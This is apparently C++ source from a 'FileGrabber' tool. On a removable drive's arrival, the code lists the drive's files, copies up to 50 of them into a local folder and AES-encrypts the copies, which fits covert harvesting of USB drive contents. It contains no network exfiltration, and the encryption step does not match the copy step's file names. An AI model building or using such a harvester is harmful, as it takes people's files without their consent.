#include "stdafx.h"
#include "FileCopyer.h"
#include <filesystem>
#include "AESKey.h"
#include "AESEncrypt.h"
#include "Convert.h"
#include <zlib.h>
#include <vector>
#include "Timer.h"
#include "ApplicationInformation.h"
#include "Log.h"
using namespace std;
namespace fs = std::filesystem;

FileCopyer::FileCopyer(const Device& device)
{
	this->device = device;
	key = AESKey();
}

FileCopyer::FileCopyer(const Device& device, shared_ptr<list<FileData>> paths)
{
	this->device = device;
	this->paths = paths;
	key = AESKey();
}

void FileCopyer::setPaths(std::shared_ptr<std::list<FileData>> paths)
{
	this->paths = paths;
}

void FileCopyer::ListFile(shared_ptr<list<FileData>> plist)
{
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	_stprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	fs::create_directory(fs::path(folderName));
	_tstring fn = folderName;
	delete[] folderName;
	folderName = nullptr;
	FILE* file;
	_tfopen_s(&file, (fn + TEXT("/flist.ifld")).c_str(), TEXT("w"));
	Device::DiskInformation info = device.GetDiskInformation();
	if (file == nullptr) {
		throw runtime_error("FileGrabber IO Error: Cannot open flist file to write.");
		return;
	}
	fwprintf_s(file, L"FileGrabber %s Generated FileList (*.ifld) File\n\nBasic Information\n--------------------------\n"\
		L"Drive Letter: %c\nLabel: %s\nSN: %lu\n" \
		L"FileSystem: %s\nTotal Space: %llu\nFreeSpace: %llu\nFreeSpaceToCaller: %llu\nFileSystemFlags: %lu\n\n"\
		L"File List\n--------------------------\n", FG_VERSION_PTR,
		info.DriveLetter, info.Label.c_str(), info.VolumeSerialNumber, info.FileSystem.c_str(), info.TotalSpace, info.FreeSpace, info.FreeSpaceToCaller,
		info.FileSystemFlags);
	for (list<FileData>::const_iterator it = plist->cbegin(); it != plist->cend(); ++it) {
		fwprintf_s(file, L"%s/%s\n", it->Directory, it->name);
	}
	fclose(file);
	LOG->i(L"FileList file sucessfully generated.");
}

void FileCopyer::Copy()
{
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	swprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	wstring fn = folderName;
	delete[] folderName;
	folderName = nullptr;
	vector<FileData> _copy;
	uint64 totalSize = 0;
	int i = 0;
	for (list<FileData>::const_iterator it = paths->cbegin(); i < 50 && it != paths->cend(); ++it, ++i) {
		if (totalSize + it->size > 20 * 1024 * 1024) {
			break;
		}
		totalSize += it->size;
		_copy.push_back(*it);
	}
	for (const FileData& data : _copy) {
		wstring path = wstring(data.Directory) + TEXT("/") + data.name;
		if (fs::exists(fn + TEXT("/") + data.name))
			continue;
		fs::copy(fs::path(path), fs::path(fn + TEXT("/") + data.name));
	}
	LOG->i(wstring(L"File copying sucessful. ") + to_wstring(i) + (i == 1 ? L" file of " : L" files of ") + to_wstring(totalSize) + L" bytes copied.");
}

void FileCopyer::Encrypt() {
	Convert convert;
	TCHAR* folderName = new TCHAR[100];
	SYSTEMTIME time = device.GetDiskArriveTime();
	swprintf_s(folderName, 100, TEXT("%u-%u-%u %02u.%02u.%02u - %u"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute,
		time.wSecond, device.GetDiskInformation().VolumeSerialNumber);
	_tstring folder = folderName;
	delete[] folderName;
	folderName = nullptr;
	FILE* table;
	AESEncrypt enc(key);
	key.WriteAESKey(convert.toANSIString(folder + L"/key.iae").c_str(), "enc.ipk");
	_wfopen_s(&table, (folder + TEXT("/fnenc.impd")).c_str(), TEXT("wt"));
	if (table == NULL) {
		throw runtime_error("FileGrabber IO Error: Cannot write FileList File.");
		return;
	}
	int name = 1;
	for (const FileData& data : *paths) {
		_tstring path = folder + TEXT("/") + to_wstring(name);
		enc.encryptFile((path + TEXT(".igfd")).c_str(), (path + TEXT(".igf")).c_str());
		fs::remove(fs::path(path + TEXT(".igfd")));
		_ftprintf_s(table, TEXT("%d %s/%s\n"), name, data.Directory, data.name);
		++name;
	}
	fclose(table);
	enc.encryptFile((TEXT("./") + folder + TEXT("/fnenc.impd")).c_str(), (TEXT("./") + folder + TEXT("/fnenc.imp")).c_str());
	fs::remove(fs::path(folder + TEXT("/fnenc.impd")));
}

void FileCopyer::Compress()
{
}
